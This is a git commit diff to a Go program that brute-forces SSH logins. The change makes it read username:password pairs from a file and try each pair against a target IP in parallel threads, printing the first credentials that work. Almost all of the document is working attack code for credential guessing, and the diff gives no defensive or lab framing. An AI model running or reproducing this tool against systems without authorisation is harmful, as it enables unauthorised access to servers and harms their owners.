c7af1983bb43cabdbdc24e550847c369706fbb37
Bhagirath Saxena <bk2358678@gmail.com>
2023-01-23 07:21:27 +0530

    Update

--- ssh-brute-force-default-credentails.go
+++ ssh-brute-force-default-credentails.go
@@ -1,8 +1,8 @@
 package main
 
 import (
-    "flag"
     "fmt"
+    "flag"
     "io/ioutil"
     "strings"
     "os"
@@ -11,9 +11,8 @@ import (
 )
 
 func main() {
-    username := flag.String("u", "root", "username for SSH login")
     ip := flag.String("ip", "127.0.0.1:22", "IP and port for SSH login")
-    passFile := flag.String("p", "ssh-password.txt", "file containing passwords to try")
+    userpassFile := flag.String("up" , "ssh-username-password.txt","File containing usernames & passwords")
     thread := flag.Int("t", 5, "number of threads to use")
     flag.Parse()
 
@@ -22,7 +21,7 @@ func main() {
     wg.Add(*thread)
 
     // Open the file
-    file, err := ioutil.ReadFile(*passFile)
+    file, err := ioutil.ReadFile(*userpassFile)
     if err != nil {
         fmt.Println(err)
         return
@@ -33,11 +32,15 @@ func main() {
     found:=false
     // Iterate through each line
     for _, line := range lines {
-        password := line
+        // Split the line by colons
+        parts := strings.Split(line, ":")
+
+        username := parts[0]
+        password := parts[1]
 
         // Set up the SSH client configuration
         config := &ssh.ClientConfig{
-            User: *username,
+            User: username,
             Auth: []ssh.AuthMethod{
                 ssh.Password(password),
             },
@@ -49,13 +52,13 @@ func main() {
             defer wg.Done()
 
             // Print "Trying password"
-            fmt.Printf("Trying %s:%s\n",*username,password)
+            fmt.Printf("Trying %s:%s\n",username,password)
 
             // Try to log in
             _, err := ssh.Dial("tcp", *ip, config)
             if err == nil {
                 // If the login is successful, print the password and exit the program
-                fmt.Printf("Successfully login with ip:%s username:%s password:%s\n",*ip,*username,password)
+                fmt.Printf("Successfully login with ip:%s username:%s password:%s\n",*ip,username,password)
                 found=true
                 os.Exit(0)
             }
